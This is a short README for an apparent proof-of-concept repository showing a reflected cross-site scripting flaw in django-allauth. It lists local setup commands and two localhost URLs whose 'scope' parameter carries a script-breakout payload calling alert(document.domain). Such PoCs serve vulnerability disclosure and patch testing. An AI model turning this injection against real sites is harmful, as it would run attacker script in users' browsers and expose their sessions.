# poc-xss-django-allauth

## Set up

- `uv run manage.py migrate`
- `uv run manage.py createsuperuser`
- `uv run manage.py runserver`

## PoC

- While logged out, go to `http://127.0.0.1:8000/accounts/login/?scope=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E`
- While logged in, go to `http://127.0.0.1:8000/accounts/3rdparty/?scope=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E`
